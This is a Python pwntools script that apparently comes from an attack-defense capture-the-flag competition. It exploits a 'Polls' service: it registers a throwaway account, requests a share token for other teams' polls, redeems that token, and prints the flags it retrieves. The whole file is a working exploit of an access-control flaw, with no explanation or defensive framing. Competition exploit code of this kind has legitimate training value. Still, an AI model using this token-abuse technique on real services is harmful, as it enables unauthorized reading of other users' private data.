#!/usr/bin/env python3
import random
import string

from pwn import remote
import sys
import json
import requests


def generate_random_string():
    length = random.randint(6, 10)
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string.encode('utf-8')


#ip = "10.60.0.1"
ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=Polls&team={ip}")
polls = [json.loads(poll) for poll in response.json()["Polls"][ip]]

# Connect to the server
r = remote(ip, 5000)
r.recvuntil(b"exit]:")

r.sendline(b"register")
r.recvuntil(b"username:")
r.sendline(generate_random_string())
r.recvuntil(b"password:")
r.sendline(generate_random_string())
print(r.recvuntil(b"exit]:").decode())

for i in polls:  # us:
    poll_id = str(i['poll_id']).encode()
    r.sendline(b"access poll")
    r.recvuntil(b"(back):")
    r.sendline(b"share")
    r.recvuntil(b"id:")
    r.sendline(poll_id)
    dump = r.recvuntil(b"exit]:")
    dump = dump.split(b"poll: ")[1].split(b"\n")[0]
    r.sendline(b"use token")
    r.recvuntil(b"Token:")
    r.sendline(dump)
    r.recvuntil(b"exit]:")
    r.sendline(b"access poll")
    r.recvuntil(b"(back):")
    r.sendline(b"show")
    r.recvuntil(b"Poll id:")
    r.sendline(poll_id)
    flag = r.recvuntil(b"exit]:")
    flag = flag.decode()
    flag = flag.split(",")[0].replace("\n","").replace(" ","")
    print(flag, flush=True)

r.close()